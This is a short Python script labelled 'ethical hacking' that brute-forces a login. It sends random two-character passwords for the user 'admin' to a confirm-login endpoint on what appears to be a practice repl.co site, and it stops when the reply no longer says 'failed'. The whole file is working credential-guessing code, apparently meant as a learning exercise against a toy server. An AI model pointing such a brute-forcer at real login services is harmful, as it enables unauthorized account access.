# Brute force ethical hacking 

import random
import sys

import requests

url = 'https://requestswebsite.notanothercoder.repl.co/confirm-login'

def send_request(username, password):
    credential = {
        "username": username,
        "password": password
    }
    req = requests.get(url, data=credential)
    return req
    
# original password is 2 char long
char = 'abcd0123'
def run():
    passbook = []
    count = 1
    while True:
        # waiting bar
        if count%2 == 0:
            print('\rWait ..|', end='')
        elif count%3 == 0:
            print('\rWait ../', end='')
        else:
            print('\rWait ..\\', end='')

        # k is my length of the password
        random_password = random.choices(char, k=2)
        password = "".join(random_password)
        count += 1
        if password in passbook:
            continue
        else:
            passbook.append(password)
        request = send_request("admin", passbook[-1])
        if 'failed' in request.text.lower():
            continue
            #print(f"Incorrect {passbook[-1]}")
        else:
            print("\nSuccess")
            print(f"Correct Password {passbook[-1]}")
            print("All tries ", passbook)
            print("Number of tries ", len(passbook))
            sys.exit()


if __name__=="__main__":
    run()
